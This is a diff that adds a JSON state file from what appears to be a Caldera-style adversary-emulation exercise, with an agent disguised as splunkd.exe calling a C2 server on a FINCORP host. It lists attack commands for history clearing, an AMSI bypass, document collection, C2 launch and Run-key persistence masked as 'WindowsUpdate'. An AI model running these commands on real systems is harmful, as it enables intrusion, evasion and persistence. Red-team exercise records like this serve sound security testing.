@@ -1,0 +1,238 @@
+{
+  "selected_agent": {
+    "paw": "qdodkl",
+    "sleep_min": 30,
+    "sleep_max": 60,
+    "watchdog": 0,
+    "group": "red",
+    "architecture": "amd64",
+    "platform": "windows",
+    "server": "http://192.168.30.45:8888",
+    "upstream_dest": "http://192.168.30.45:8888",
+    "username": "FINCORP\\Administrator",
+    "location": "C:\\Users\\Public\\splunkd.exe",
+    "pid": 7400,
+    "ppid": 2404,
+    "trusted": true,
+    "executors": [
+      "proc",
+      "cmd",
+      "psh"
+    ],
+    "privilege": "Elevated",
+    "exe_name": "splunkd.exe",
+    "host": "PDL2",
+    "contact": "HTTP",
+    "proxy_receivers": {},
+    "proxy_chain": [],
+    "origin_link_id": "",
+    "deadman_enabled": true,
+    "available_contacts": [
+      "HTTP"
+    ],
+    "host_ip_addrs": [
+      "10.3.10.101",
+      "192.168.30.61"
+    ],
+    "display_name": "PDL2$FINCORP\\Administrator",
+    "created": "2026-04-02T08:42:23Z",
+    "last_seen": "2026-04-02T08:56:42Z",
+    "links": [
+      {
+        "id": "ce213060-a6d9-40c6-b1fe-e9c43bfb4df1",
+        "paw": "qdodkl",
+        "command": "Q2xlYXItSGlzdG9yeTtDbGVhcg==",
+        "plaintext_command": "Q2xlYXItSGlzdG9yeTtDbGVhcg==",
+        "status": 0,
+        "score": 0,
+        "jitter": 0,
+        "decide": "2026-04-02T08:42:23Z",
+        "pin": 0,
+        "pid": "3960",
+        "facts": [],
+        "relationships": [],
+        "used": [],
+        "unique": "ce213060-a6d9-40c6-b1fe-e9c43bfb4df1",
+        "collect": "2026-04-02T08:42:23Z",
+        "finish": "2026-04-02T08:42:26Z",
+        "ability": {
+          "ability_id": "43b3754c-def4-4699-a673-1d85648fda6a",
+          "tactic": "defense-evasion",
+          "technique_name": "Indicator Removal on Host: Clear Command History",
+          "technique_id": "T1070.003",
+          "name": "Avoid logs",
+          "description": "Stop terminal from logging history",
+          "executors": [
+            {
+              "name": "sh",
+              "platform": "darwin",
+              "command": "> $HOME/.bash_history && unset HISTFILE",
+              "code": null,
+              "language": null,
+              "build_target": null,
+              "payloads": [],
+              "uploads": [],
+              "timeout": 60,
+              "parsers": [],
+              "cleanup": [],
+              "variations": [],
+              "additional_info": {}
+            },
+            {
+              "name": "sh",
+              "platform": "linux",
+              "command": "> $HOME/.bash_history && unset HISTFILE",
+              "code": null,
+              "language": null,
+              "build_target": null,
+              "payloads": [],
+              "uploads": [],
+              "timeout": 60,
+              "parsers": [],
+              "cleanup": [],
+              "variations": [],
+              "additional_info": {}
+            },
+            {
+              "name": "psh",
+              "platform": "windows",
+              "command": "Clear-History;Clear",
+              "code": null,
+              "language": null,
+              "build_target": null,
+              "payloads": [],
+              "uploads": [],
+              "timeout": 60,
+              "parsers": [],
+              "cleanup": [],
+              "variations": [],
+              "additional_info": {}
+            }
+          ],
+          "requirements": [],
+          "privilege": null,
+          "repeatable": false,
+          "buckets": [
+            "defense-evasion"
+          ],
+          "additional_info": {},
+          "access": {},
+          "singleton": false,
+          "plugin": "stockpile",
+          "delete_payload": true
+        },
+        "executor": {
+          "name": "psh",
+          "platform": "windows",
+          "command": "Clear-History;Clear",
+          "code": null,
+          "language": null,
+          "build_target": null,
+          "payloads": [],
+          "uploads": [],
+          "timeout": 60,
+          "parsers": [],
+          "cleanup": [],
+          "variations": [],
+          "additional_info": {}
+        },
+        "cleanup": 0,
+        "visibility": {
+          "score": 50,
+          "adjustments": []
+        },
+        "host": "PDL2",
+        "output": "False",
+        "deadman": false,
+        "agent_reported_time": "2026-04-02T08:42:21Z"
+      }
+    ],
+    "pending_contact": "HTTP",
+    "status": "dead"
+  },
+  "selected_adversary": {
+    "adversary_id": "6308830d-3d43-4e01-9057-1a63a25d0b74",
+    "name": "gruppo1",
+    "description": "---",
+    "atomic_ordering": [
+      "amsi_bypass",
+      "discovery_users",
+      "persistence_registry",
+      "collection_files",
+      "c2_internal"
+    ],
+    "objective": "495a9828-cab1-44dd-a0ca-66e58177d8cc",
+    "tags": [],
+    "has_repeatable_abilities": false,
+    "plugin": ""
+  },
+  "operation_adversary": {
+    "adversary_id": "temp-seed-qdodkl-1775120622",
+    "name": "Temp Seed Windows - gruppo1",
+    "description": "Auto-generated seed adversary from 6308830d-3d43-4e01-9057-1a63a25d0b74 for agent qdodkl",
+    "atomic_ordering": [
+      "discovery_users",
+      "amsi_bypass",
+      "collection_files",
+      "c2_internal",
+      "persistence_registry"
+    ]
+  },
+  "temp_adversary_info": {
+    "saved": true,
+    "adversary": {
+      "adversary_id": "temp-seed-qdodkl-1775120622",
+      "name": "Temp Seed Windows - gruppo1",
+      "description": "Auto-generated seed adversary from 6308830d-3d43-4e01-9057-1a63a25d0b74 for agent qdodkl",
+      "atomic_ordering": [
+        "discovery_users",
+        "amsi_bypass",
+        "collection_files",
+        "c2_internal",
+        "persistence_registry"
+      ]
+    },
+    "selected_abilities": [
+      {
+        "ability_id": "discovery_users",
+        "name": "User Discovery",
+        "tactic": "discovery",
+        "technique_id": "T1033",
+        "noisy_score": 7,
+        "command_preview": "whoami whoami /priv net user net localgroup administrators "
+      },
+      {
+        "ability_id": "amsi_bypass",
+        "name": "AMSI Bypass",
+        "tactic": "defense-evasion",
+        "technique_id": "T1562.001",
+        "noisy_score": 1,
+        "command_preview": "$s=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils'); $f=$s.GetField('amsiInitFailed…"
+      },
+      {
+        "ability_id": "collection_files",
+        "name": "Sensitive File Discovery",
+        "tactic": "collection",
+        "technique_id": "T1005",
+        "noisy_score": 1,
+        "command_preview": "Get-ChildItem C:\\Users -Recurse -Include *.docx,*.pdf,*.txt -ErrorAction SilentlyContinue | Select-…"
+      },
+      {
+        "ability_id": "c2_internal",
+        "name": "Internal C2",
+        "tactic": "command-and-control",
+        "technique_id": "T1071.001",
+        "noisy_score": 0,
+        "command_preview": "Start-Process C:\\Users\\Public\\splunkd.exe ` -ArgumentList \"-server http://192.168.30.45:8888 -group…"
+      },
+      {
+        "ability_id": "persistence_registry",
+        "name": "Registry Persistence",
+        "tactic": "persistence",
+        "technique_id": "T1547.001",
+        "noisy_score": 0,
+        "command_preview": "New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" ` -Name \"WindowsUpdate…"
+      }
+    ]
+  }
+}
